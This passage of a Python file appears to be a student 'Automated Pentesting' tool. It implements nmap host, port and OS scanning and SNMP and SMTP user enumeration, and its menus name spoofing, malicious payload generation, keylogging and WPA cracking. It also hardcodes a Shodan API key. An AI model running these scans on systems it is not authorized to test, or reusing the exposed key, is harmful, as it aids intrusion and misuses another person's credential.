#Capstobne Project
#Members: Aw Jin Le Ray, Kim Junghan, Lucas Sim
import sys
import nmap
import shodan
import sqlite3
from sqlite3 import Error
import pyfiglet #pip install pyfiglet
import os
import csv
#import scrapy #pip install scrapy
#from scrapy.spiders import CrawlSpider, Rule
#from scrapy.linkextractors import LinkExtractor
from googlesearch import search #pip install beautifulsoup4 and google
import requests #pip install requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup #pip install bs4
import colorama #pip install colorama
import dns.resolver
import whois
import webb #pip install webb
import builtwith #pip install builtwith
from scapy.all import *
import ldap3
import pandas as pd
from zapv2 import ZAPv2 #pip install python-owasp-zap-v2.4
import time
import subprocess

#FOR OPENVAS
import subprocess
import re

import xmltodict
import lxml.etree as ET
from gvm.connections import UnixSocketConnection
from gvm.protocols.latest import Gmp
from gvm.transforms import EtreeTransform
from gvm.xml import pretty_print
from terminaltables import SingleTable, DoubleTable

# Creating Directories

subprocess.call("mkdir Payloads", shell=True)
subprocess.call("mkdir Reports", shell=True)

#Shodan API KEY
Shodan_APIKEY = 'EBeU0lGqtIO6yCxVFCWC4nUVbvovtjo5'
api = shodan.Shodan(Shodan_APIKEY)
#Spidering Global Variables
total_urls_visited = 0

#Setting Up Database
conn = sqlite3.connect("Reconnaissance.db")
conn = sqlite3.connect("Vulnerability.db")
conn = sqlite3.connect("Exploitation.db")
conn = sqlite3.connect("Spider.db")
cur = conn.cursor()
conn.execute('ATTACH DATABASE "Spider.db" as "SpiDB"')
conn.execute('ATTACH DATABASE "Exploitation.db" as "ExpDB"')
conn.execute('ATTACH DATABASE "Vulnerability.db" as "VulDB"')
conn.execute('ATTACH DATABASE "Reconnaissance.db" as "RecDB"')

def createtablesS():
    conn.execute('''CREATE TABLE IF NOT EXISTS SpiDB.Spider
    (id integer primary key, Internal_Links TEXT, External_Links TEXT)''')
    conn.commit()
def droptablesS():
    conn.execute('''DELETE FROM SpiDB.Spider''')
    conn.commit()

def createtablesR():
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.Google_Search
    (id integer primary key, Search TEXT, Results TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.Whois_Enumeration
    (id integer primary key, Host TEXT, Domain TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.PortDiscovery
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, 
    Reason TEXT, Name TEXT, Product  TEXT, Version  TEXT, Extra_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.HostDiscovery
    (id integer primary key, Host TEXT, State TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.OSDiscovery
    (id integer primary key, Host TEXT, Device_Type TEXT, OS TEXT, OS_CPE TEXT, OS_Details TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.SNMP_OS_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Hardware TEXT, Software TEXT, System_uptime TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.SNMP_Process_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Processes TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.SNMP_Software_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Softwares TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.SNMP_Interface_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Interfaces TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.SMTP_Users_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Users TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.NFS_Share_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Shares TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.LDAP_Information_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Server_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.LDAP_Users_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Connection_Entries TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.LDAP_Brute_Enumeration
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, ldap_brute TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.RPC
    (id integer primary key, Host TEXT, RPC_Info TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.DNS_Enumeration
    (id integer primary key, Domain TEXT, Record_Type TEXT, Data TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.Allowed_Methods
    (id integer primary key, Domain TEXT, Item TEXT, Result TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS RecDB.Built_With
    (id integer primary key, Domain TEXT, Name TEXT, Language TEXT)''')
    conn.commit()
def droptablesR():
    conn.execute('''DELETE FROM RecDB.Google_Search''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.Whois_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.PortDiscovery''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.HostDiscovery''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.OSDiscovery''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.SNMP_OS_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.SNMP_Process_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.SNMP_Software_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.SNMP_Interface_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.SMTP_Users_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.NFS_Share_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.LDAP_Information_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.LDAP_Users_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.LDAP_Brute_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.RPC''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.DNS_Enumeration''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.Allowed_Methods''')
    conn.commit()
    conn.execute('''DELETE FROM RecDB.Built_With''')
    conn.commit()

def createtablesV():
    conn.execute('''CREATE TABLE IF NOT EXISTS VulDB.OpenVAS
    (id integer primary key, Task_Name TEXT, Vulnerability TEXT, Risk TEXT, Severity TEXT, CVE_ID TEXT,
    Description TEXT, Solution TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS VulDB.Vulnerable_Ports
    (id integer primary key, Host TEXT, Protocol TEXT, Port_Number TEXT, Port_Status TEXT, Vulnerability TEXT)''')
    conn.commit()
def droptablesV():
    conn.execute('''DELETE FROM VulDB.OpenVAS''')
    conn.commit()
    conn.execute('''DELETE FROM VulDB.Vulnerable_Ports''')
    conn.commit()

def createtablesE():
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.Packet_Sniffing
    (id integer primary key, Interface TEXT, Timeout TEXT, Filter TEXT, Packet TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.ARP_Spoofing 
    (id integer primary key, Target_IP, Default_Gateway, Verbose,Target_Mac_Addr)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.DNS_Spoofing 
    (id integer primary key, Target_IP, Default_Gateway, Verbose,Target_Mac_Addr)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.VNC 
    (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT, Payload TEXT, Listening TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.Keyscan 
    (id integer primary key, Target_IP TEXT, Port TEXT, Exploit TEXT, Payload TEXT, Listening TEXT, Keyscan_Runtime TEXT, Clean_Content TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.LLMNR 
    (id integer primary key, Username TEXT, Password TEXT, Domain TEXT, Password_Hash TEXT)''')
    conn.commit()
    conn.execute('''CREATE TABLE IF NOT EXISTS ExpDB.WPA 
    (id integer primary key, Hash TEXT, Network TEXT, Password TEXT)''')
    conn.commit()
def droptablesE():
    conn.execute('''DELETE FROM ExpDB.Packet_Sniffing''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.ARP_Spoofing''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.DNS_Spoofing''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.VNC''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.Keyscan''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.LLMNR''')
    conn.commit()
    conn.execute('''DELETE FROM ExpDB.WPA''')
    conn.commit()

def createtables():
    createtablesS()
    createtablesR()
    createtablesV()
    createtablesE()

def droptables():
    droptablesS()
    droptablesR()
    droptablesV()
    droptablesE()

createtables()
loop = True
def project_menu():
    loop = True
    while loop == True:
        ascii_hi = pyfiglet.figlet_format("Welcome to Automated Pentesting!")
        print(ascii_hi)
        print("\nPlease Select an Option Below.")
        print("1. Reconnaissance")
        print("2. Vulnerability Scanning")
        print("3. Exploitation & Post Exploitation")
        print("4. Database Services")
        print("5. End Session")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            recon_menu()
        elif menu_input == "2":
            vulnscanning_menu()
        elif menu_input == "3":
            exploit_menu()
        elif menu_input == "4":
            database_menu()
        elif menu_input == "5":
            ascii_bye = pyfiglet.figlet_format("Goodbye!")
            print(ascii_bye)
            cur.close()
            conn.close()
            loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def recon_menu():

    recon_loop = True
    while recon_loop == True:
        ascii_recon = pyfiglet.figlet_format("Reconnaissance")
        print(ascii_recon)
        print("\nPlease Select an Option Below.")
        print("1. Footprinting")
        print("2. Scanning")
        print("3. Enumeration")
        print("4. Exit")
    
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_footprinting = pyfiglet.figlet_format("Footprinting")
            print(ascii_footprinting)
            footprinting_menu()
        elif menu_input == "2":
            ascii_scanning = pyfiglet.figlet_format("Scanning")
            print(ascii_scanning)
            scanning_menu()
        elif menu_input == "3":
            ascii_enum = pyfiglet.figlet_format("Enumeration")
            print(ascii_enum)
            enum_menu()
        elif menu_input == "4":
            recon_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def footprinting_menu():
    footprinting_loop = True
    while footprinting_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Google Search")
        print("2. Whois Lookup")
        print("3. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_google = pyfiglet.figlet_format("Google Search")
            print(ascii_google)
            googleSearch()
        elif menu_input == "2":
            ascii_whois = pyfiglet.figlet_format("Whois Lookup")
            print(ascii_whois)
            whois_enum()
        elif menu_input == "3":
            footprinting_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue



def scanning_menu():
    scanning_loop = True
    while scanning_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Host Discovery")
        print("2. Port and Service Discovery")
        print("3. OS Discovery")
        print("4. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Host Discovery")
            print(ascii_1)
            hostDiscovery()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Port and Service Discovery")
            print(ascii_2)
            portDiscovery()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("OS Discovery")
            print(ascii_3)
            osDiscovery()
        elif menu_input == "4":
            scanning_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue



def enum_menu():
    enum_loop = True
    while enum_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Spidering")
        print("2. SNMP OS Enumeration")
        print("3. SNMP Processes Enumeration")
        print("4. SNMP Software Enumeration")
        print("5. SNMP Interface Enumeration")
        print("6. SMTP Users Enumeration")
        print("7. NFS Share Enumeration")
        print("8. LDAP Information Enumeration")
        print("9. LDAP Users Enumeration")
        print("10. LDAP Username Enumeration using LDAP Brute")
        print("11. RPC Information Enumeration")
        print("12. DNS Enumeration")
        print("13. Website Allowed Methods")
        print("14. Website Built With")
        print("15. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Spidering")
            print(ascii_1)
            spidering()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("SNMP OS Enumeration")
            print(ascii_2)
            snmp_os()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("SNMP Processes Enumeration")
            print(ascii_3)
            snmp_processes()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("SNMP Software Enumeration")
            print(ascii_4)
            snmp_software()
        elif menu_input == "5":
            ascii_5 = pyfiglet.figlet_format("SNMP Interface Enumeration")
            print(ascii_5)
            snmp_interface()
        elif menu_input == "6":
            ascii_6 = pyfiglet.figlet_format("SMTP Users Enumeration")
            print(ascii_6)
            smtp_users()
        elif menu_input == "7":
            ascii_7 = pyfiglet.figlet_format("NFS Share Enumeration")
            print(ascii_7)
            nfs_share()
        elif menu_input == "8":
            ascii_8 = pyfiglet.figlet_format("LDAP Information Enumeration")
            print(ascii_8)
            ldap_info()
        elif menu_input == "9":
            ascii_9 = pyfiglet.figlet_format("LDAP Users Enumeration")
            print(ascii_9)
            ldap_users()
        elif menu_input == "10":
            ascii_10 = pyfiglet.figlet_format("LDAP Username Enumeration using LDAP Brute")
            print(ascii_10)
            ldap_brute()
        elif menu_input == "11":
            ascii_11 = pyfiglet.figlet_format("RPC Information Enumeration")
            print(ascii_11)
            rpc_info()
        elif menu_input == "12":
            ascii_12 = pyfiglet.figlet_format("DNS Enumeration")
            print(ascii_12)
            dns_enum()
        elif menu_input == "13":
            ascii_13 = pyfiglet.figlet_format("Website Allowed Methods")
            print(ascii_13)
            allowed_methods()
        elif menu_input == "14":
            ascii_14 = pyfiglet.figlet_format("Website Built With")
            print(ascii_14)
            built_with()
        elif menu_input == "15":
            enum_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue


def vulnscanning_menu():
    vulnscanning_loop = True
    while vulnscanning_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. OpenVAS")
        print("2. ZAP Spidering + Active Scan")
        print("3. TCP Port Scanning")
        print("4. UDP Port Scanning")
        print("5. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("OpenVAS")
            print(ascii_1)
            openvas_menu()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("ZAP Spidering + Active Scan")
            print(ascii_2)
            zap_scan()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("TCP Port Scanning")
            print(ascii_3)
            vulnerable_tcp_ports()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("UDP Port Scanning")
            print(ascii_4)
            vulnerable_udp_ports()
        elif menu_input == "5":
            vulnscanning_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def exploit_menu():
    exploit_loop = True
    while exploit_loop == True:
        #Input Scanning Options
        print("\nPlease Select an Option Below.")
        print("1. Packet Sniffer")
        print("2. ARP Spoof")
        print("3. DNS Spoof")
        print("4. Reverse TCP Exploits")
        print("5. LLMNR / NBT-NS Poisoning")
        print("6. WPA/WPA2 Crack")
        print("7. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
            print(ascii_1)
            packet_sniffer()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("ARP Spoof")
            print(ascii_2)
            arp_spoof()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("DNS Spoof")
            print(ascii_3)
            dns_spoof()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("Reverse TCP Exploits")
            print(ascii_4)
            reverse_tcp_menu()
        elif menu_input == "5":
            ascii_5 = pyfiglet.figlet_format("LLMNR / NBT-NS Poisoning")
            print(ascii_5)
            llmnr_nbtns_menu()
        elif menu_input == "6":
            ascii_6 = pyfiglet.figlet_format("WPA/WPA2 Cracking")
            print(ascii_6)
            wpa_menu()
        elif menu_input == "7":
            exploit_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def database_menu():
    database_loop = True
    while database_loop == True:
        ascii_database = pyfiglet.figlet_format("Database")
        print(ascii_database)
        print("\nPlease Select an Option Below.")
        print("1. Clear Database")
        print("2. Exit")

        menu_input = (input("Select option: "))
        if menu_input == "1":
            droptables()
            conn.execute('''DELETE FROM Spider''')
            conn.commit()
            print("Database successfully cleared!")
        # elif menu_input == "2":
        #     DBname = str(input('Enter new Database name here: '))
        #     newDBname = DBname + ".db"
        #     conn = sqlite3.connect(newDBname)
        #     conn.execute('ATTACH DATABASE newDBname as "newDB"')
        #     conn.execute('ATTACH DATABASE "APTdatabase.db" as "oldDB"')
        #     newdatabase(conn)
        #     print("Database " + "APTdatabase.db" + "successfully copied as " + newDBname)
        elif menu_input == "2":
            database_loop = False
        else:
                print("Invalid Input!\nPlease Try Again!")
                continue

def openvas_menu():
    openvas_loop = True
    while openvas_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Start OpenVAS")
        print("2. Start a new OpenVAS Scan")
        print("3. Download OpenVAS Report")
        print("4. Stop OpenVAS")
        print("5. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Start OpenVAS")
            print(ascii_1)
            start_openvas()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Start a new OpenVAS Scan")
            print(ascii_2)
            start_openvas_scan()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("Download OpenVAS Report")
            print(ascii_3)
            get_openvas_report()
        elif menu_input == "4":
            ascii_4 = pyfiglet.figlet_format("Stop OpenVAS")
            print(ascii_4)
            stop_openvas()
        elif menu_input == "5":
            openvas_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def vnc_menu():
    reverse_tcp_loop = True
    while reverse_tcp_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Generate Malicious Payload")
        print("2. Run VNC Exploit")
        print("3. Run Keyscan Exploit")
        print("4. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Generate Malicious Payload")
            print(ascii_1)
            generate_malicious_payload()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Run VNC Exploit")
            print(ascii_2)
            vnc_exploit()
        elif menu_input == "3":
            ascii_3 = pyfiglet.figlet_format("Run Keyscan Exploit")
            print(ascii_2)
            keyscan_exploit()
        elif menu_input == "4":
            reverse_tcp_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue



def llmnr_nbtns_menu():
    llmnr_nbtns_loop = True
    while llmnr_nbtns_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Start Listener")
        print("2. Crack Hash Generated")
        print("3. Exit")
        menu_input = (input("Select option: "))
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Start Listener")
            print(ascii_1)
            start_listener()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Crack Hash Generated")
            print(ascii_2)
            crack_hash_generated()
        elif menu_input == "3":
            llmnr_nbtns_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def wpa_menu():
    wpa_loop = True
    while wpa_loop == True:
        print("\nPlease Select an Option Below.")
        print("1. Capture Handshake File")
        print("2. Crack WPA/WPA2 Password")
        print("3. Exit")
        menu_input = input("Select option: ")
        if menu_input == "1":
            ascii_1 = pyfiglet.figlet_format("Capture Handshake File")
            print(ascii_1)
            capture_handshake()
        elif menu_input == "2":
            ascii_2 = pyfiglet.figlet_format("Crack WPA/WPA2 Password")
            print(ascii_2)
            crack_password()
        elif menu_input == "3":
            wpa_loop = False
        else:
            print("Invalid Input!\nPlease Try Again!")
            continue

def portDiscovery():
    target = input("Enter an IP Address to scan: ")
    port_range = input("Enter the range of ports to scan (eg. 1-1024, or enter nothing for no port range): ")
    scanner = nmap.PortScanner()
    if port_range == "":
        scanner.scan(target)
    else:
        scanner.scan(target, port_range)
    for host in scanner.all_hosts():
         print('Host : %s (%s)' % (host, scanner[host].hostname()))
         print('State : %s' % scanner[host].state())
         for proto in scanner[host].all_protocols():
             print('----------')
             print('Protocol : %s' % proto)
     
             lport = scanner[host][proto].keys()
             for port in lport:
                 PortDiscoveryList = [str(target), str(proto), str(port), str(scanner[host][proto][port]['state']), 
                                      str(scanner[host][proto][port]['reason']), str(scanner[host][proto][port]['name']),
                                      str(scanner[host][proto][port]['product']), str(scanner[host][proto][port]['version']),
                                      str(scanner[host][proto][port]['extrainfo'])]
                 cur.execute('''INSERT INTO RecDB.PortDiscovery 
                 (id, Host, Protocol, Port_Number, Port_Status, Reason, Name, Product, Version, Extra_Info) 
                 VALUES (NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', PortDiscoveryList)
                 conn.commit()
                 print ('port : %s\tstate : %s\treason : %s\tservice : %s\t version : %s %s (%s)'
                          % (port, scanner[host][proto][port]['state'], 
                             scanner[host][proto][port]['reason'], 
                             scanner[host][proto][port]['name'],
                             scanner[host][proto][port]['product'],
                             scanner[host][proto][port]['version'],
                             scanner[host][proto][port]['extrainfo']))

def hostDiscovery():
    scanner = nmap.PortScanner()
    target = input("Enter an IP Address to scan: ")
    scanner.scan(target, arguments='-n -sP')
    for host in scanner.all_hosts():
        hostDiscoveryList = [str(host), str(scanner[host]['status']['state'])]
        cur.execute('''INSERT INTO RecDB.HostDiscovery 
        (id, Host, State) 
        VALUES (NULL, ?, ?)''', hostDiscoveryList)
        conn.commit()
        print(host + " is " + scanner[host]['status']['state'])


def osDiscovery():
    target = input("Enter an IP Address to scan: ")
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-O')
    for host in scanner.all_hosts():
        print(host)
        if scanner[host]['osmatch'][0]:
            OSDiscoveryList = [str(host), str(scanner[host]['osmatch'][0]['osclass'][0]['type']),
                               str((scanner[host]['osmatch'][0]['osclass'][0]['vendor']) + ' ' +
                               (scanner[host]['osmatch'][0]['osclass'][0]['osfamily']) + ' ' + 
                               (scanner[host]['osmatch'][0]['osclass'][0]['osgen'])),
                                str(scanner[host]['osmatch'][0]['osclass'][0]['cpe'][0]),
                                str(scanner[host]['osmatch'][0]['name'])]
            cur.execute('''INSERT INTO RecDB.OSDiscovery 
            (id, Host, Device_Type, OS, OS_CPE, OS_Details) 
            VALUES (NULL, ?, ?, ?, ?, ?)''', OSDiscoveryList)
            conn.commit()
            print('Device type: ' + (scanner[host]['osmatch'][0]['osclass'][0]['type']))
            print("Operating System running: " + (scanner[host]['osmatch'][0]['osclass'][0]['vendor']) + ' ' +
                                                  (scanner[host]['osmatch'][0]['osclass'][0]['osfamily']) + ' ' + 
                                                  (scanner[host]['osmatch'][0]['osclass'][0]['osgen']))
            print("OS CPE: " + (scanner[host]['osmatch'][0]['osclass'][0]['cpe'][0]))
            print("OS Details: " + (scanner[host]['osmatch'][0]['name']))
        else:
            print('Failed to determine operating system')
 
#SNMP OS Enumeration
def snmp_os():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-sysdescr')
                    print(snmp[host][proto][port]['script']['snmp-sysdescr'])
                    pos = 0
                    list = []
                    for i in snmp[host][proto][port]['script']['snmp-sysdescr']:
                        pos += 1
                        if i == ":":
                            list.append(pos+1)
                            continue
                    snmpOSList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[0]:list[1]-12]),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[1]:list[2]-15]),
                                  str(snmp[host][proto][port]['script']['snmp-sysdescr'][list[2]:])]
                    cur.execute('''INSERT INTO RecDB.SNMP_OS_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Hardware, Software, System_uptime) 
                    VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', snmpOSList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")

#SNMP Processes Enumeration
def snmp_processes():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-processes')
                    print(snmp[host][proto][port]['script']['snmp-processes'])
                    # pos = 0
                    # list = []
                    # for i in snmp[host][proto][port]['script']['snmp-processes']:
                    #     pos += 1
                    #     if i == ":":
                    #         list.append(pos+1)
                    #         continue
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[0]:list[1]-12])
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[1]:list[2]-15])
                    # snmpProcessesList.append(snmp[host][proto][port]['script']['snmp-processes'][list[2]:])
                    snmpProcessesList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                         str(snmp[host][proto][port]['script']['snmp-processes'])]
                    cur.execute('''INSERT INTO RecDB.SNMP_Process_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Processes) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', snmpProcessesList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")
    
#SNMP Software Enumeration
def snmp_software():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-win32-software')
                    print(snmp[host][proto][port]['script']['snmp-win32-software'])
                    snmpSoftwareList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                                        str(snmp[host][proto][port]['script']['snmp-win32-software'])]
                    cur.execute('''INSERT INTO RecDB.SNMP_Software_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Softwares) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', snmpSoftwareList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")

#SNMP Interface Enumeration
def snmp_interface():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 161')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    snmp = nmap.PortScanner()
                    snmp.scan(host, arguments='-sU -p 161 --script snmp-interfaces')
                    print(snmp[host][proto][port]['script']['snmp-interfaces'])
                    snmpInterfaceList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(snmp[host][proto][port]['script']['snmp-interfaces'])]
                    cur.execute('''INSERT INTO RecDB.SNMP_Interface_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Interfaces) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', snmpInterfaceList)
                    conn.commit()
                else:
                    print("Port 161 (SNMP) not opened, can't perform SNMP Enumeration")


#SMTP Users Enumeration
def smtp_users():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 25')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    smtp = nmap.PortScanner()
                    smtp.scan(host, arguments='-p 25 --script smtp-enum-users')
                    print(smtp[host][proto][port]['script']['smtp-enum-users'])
